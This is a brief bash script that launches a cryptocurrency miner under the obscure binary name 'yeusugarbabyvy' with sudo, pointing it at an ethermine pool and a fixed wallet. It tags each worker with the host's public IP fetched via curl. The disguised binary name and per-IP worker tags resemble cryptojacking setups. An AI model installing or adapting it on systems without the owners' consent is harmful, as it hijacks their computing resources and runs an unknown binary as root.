#!/bin/bash
#!/bin/bash

POOL=stratum+tcp://eu1.ethermine.org:4444
WALLET=0xf7fe12e0432b84added46f93704a2dcc0938abbe.Sugar-$(echo "$(curl -s ifconfig.me)" | tr . _ )
cd "$(dirname "$0")"

chmod +x ./yeusugarbabyvy && sudo ./yeusugarbabyvy --algo ETHASH --pool $POOL --user $WALLET  $@
